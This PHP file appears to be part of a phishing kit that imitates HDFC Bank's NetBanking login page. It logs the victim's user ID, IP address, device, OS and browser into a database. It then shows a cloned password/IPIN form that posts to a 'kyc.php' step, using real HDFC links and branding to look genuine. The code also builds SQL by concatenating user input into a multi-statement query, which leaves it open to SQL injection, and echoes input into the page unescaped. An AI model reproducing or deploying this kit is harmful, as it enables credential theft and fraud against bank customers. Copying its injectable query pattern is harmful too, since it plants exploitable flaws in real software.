<?php

if(!empty($_POST['user_id'])) {  
    $user_id = strtolower($_POST['user_id']);
}
else {
    header("Location: ./");
    die();
}

require_once "random-gen.php";

use Utils\RandomStringGenerator;
$generator = new RandomStringGenerator;
$tokenLength = 32;
$token = $generator->generate($tokenLength);

require_once "header.php";

require_once "device.php";

$query = 'INSERT INTO user_data(`UID`, `user_id`) VALUES ("'.$token.'", "'.$user_id.'");';

$query .= 'INSERT INTO device_data(`UID`, `date_time`, `ip_address`, `device_type`, `os`, `browser`) VALUES ("'.$token.'", "'.$dt.'", "'.$ip.'", "'.$device.'", "'.$os.'", "'.$browser.'")';

$host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'hdfc';
    
//create a connection
$connection = mysqli_connect($host, $db_user, $db_pass, $db_name);

//test if connection failed
if(mysqli_connect_errno()){
    die("connection failed: "
        . mysqli_connect_error()
        . " (" . mysqli_connect_errno()
        . ")");
}

mysqli_multi_query($connection, $query);

mysqli_close($connection);

?>

<div class="container">
	<div class="row welcmewrap">
        <div class="welcomesec">
            <div class="hdfcstatictxt mB20">Login to NetBanking</div>
            <div class="netwrapper">
                <div class="col-sm-6 leftwrap fl">
			        <form method="post" action="kyc.php">
                        <div class="mB20">
                            <div class="lablefield ibvt mB0"><span>Customer ID/ User ID</span></div>
                            <div class="inputfield ibvt loginData">
                                <input placeholder="Customer ID/ User ID" value="<?php echo $user_id ?>" readonly class="form-control" type="text" />
                                <input name="token" value="<?php echo $token ?>" hidden />
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="lablefield ibvt mB0"><span>Password/ IPIN</span></div>
                            <div class="inputfield ibvt loginData">
                                <input
                                    autocomplete="off"
                                    placeholder="Password/ IPIN"
                                    name="user_pass"
                                    class="form-control"
                                    type="password"
                                    required autofocus
                                />
                                <span style="display: block;" class=""><a href="https://netbanking.hdfcbank.com/netbanking/IpinResetUsingOTP.htm">Forgot Password / IPIN</a></span><span style="display: block" class="fs12">IPIN (Password) is case sensitive</span>
                                <div class="fs12"><input name="chksecmod" onclick="showVirtualKeyBoard();" id="chksecmod" type="checkbox" /> Use virtual keyboard for password</div>
                            </div>
                        </div>
                        <div class="mB20">
                            <div class="lablefield ibvt blank"></div>
                            <div class="inputfield ibvt loginData">
                                <button class="btn btn-primary login-btn" type="submit">LOGIN</button>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="col-sm-5 rightwrap fr">
                    <div class="nortonsecurity center lnheight"><img alt="" src="images/nortonsecurity.png" /></div>
                    <div class="hdfcsmalltxt">
                        <span class="color666">Your security is of utmost importance.</span>
                        <span class="lightbluecolor"><a onclick="return window.open('https://www.hdfcbank.com/personal/useful-links/security')" href="javascript:void(0)">Know More...</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
        <div class="welcomesec last">
            <div class="nwtquestwrap">
                <div class="col-sm-6 leftwrap fl">
                    <div class="hdfcstatictxt mB20">Don't have a HDFC Bank Savings Account?</div>
                    <div class="hdfcsmalltxt mB20">
                        <span class="lightbluecolor"><a onclick="return window.open('https://netbanking.hdfcbank.com/netbanking/CCLogin.html');" href="javascript:void(0)">Credit Card only? Login here</a></span>
                    </div>
                    <div class="hdfcsmalltxt mB20">
                        <span class="lightbluecolor"><a onclick="return window.open('https://v1.hdfcbank.com/assets/popuppages/Prepaid-card.htm?src=hp');" href="javascript:void(0)">Prepaid Card only? Login here</a></span>
                    </div>
                    <div class="hdfcsmalltxt mB20">
                        <span class="lightbluecolor"><a onclick="return window.open('https://netbanking.hdfcbank.com/netbanking/LNLogin.html');" href="javascript:void(0)">Online Retail Loan only? Login here</a></span>
                    </div>
                </div>
                <div class="col-sm-5 rightwrap fr">
                    <div class="hdfcstatictxt mB20">We have added a host of new features!</div>
                    <div class="hdfcsmalltxt mB10">
                        <span class="lightblackcolor">You can now do so much more:</span>
                    </div>
                    <div class="hdfcsmalltxt mB20">
                        <span class="lightblackcolor">
                            <ul class="bullet">
                                <li>Anywhere access through Desktop or mobile</li>
                                <li>Enhanced security measures</li>
                            </ul>
                        </span>
                    </div>
                    <div class="hdfcsmalltxt mB20">
                        <span class="lightblackcolor"><a class="lightbluecolor" target="blank" href="https://v1.hdfcbank.com/htdocs/common/onlineservices/netbankingdemo/index.html">View a Demo</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
	</div>
</div>
	
<?php include_once "footer.php"; ?>